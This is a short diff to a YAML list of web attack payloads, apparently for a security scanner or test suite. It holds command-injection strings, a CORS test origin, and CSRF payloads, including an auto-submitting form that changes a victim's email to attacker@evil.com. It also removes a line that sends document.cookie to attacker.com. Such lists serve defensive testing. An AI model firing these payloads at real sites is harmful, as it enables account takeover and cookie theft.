@@ -29,7 +29,13 @@ payloads:
     - ";id"
     - "`id`"
   csrf:
-    - "<img src='http://attacker.com/log?c=' + document.cookie>"
+    - "<img src='https://victim-site.com/delete_account?id=1'>"
+    - |
+      <form action="https://victim-site.com/change_email" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        <input type="submit">
+      </form>
+      <script>document.forms[0].submit();</script>
   cors:
     - "https://evil.com"
   open_redirect:
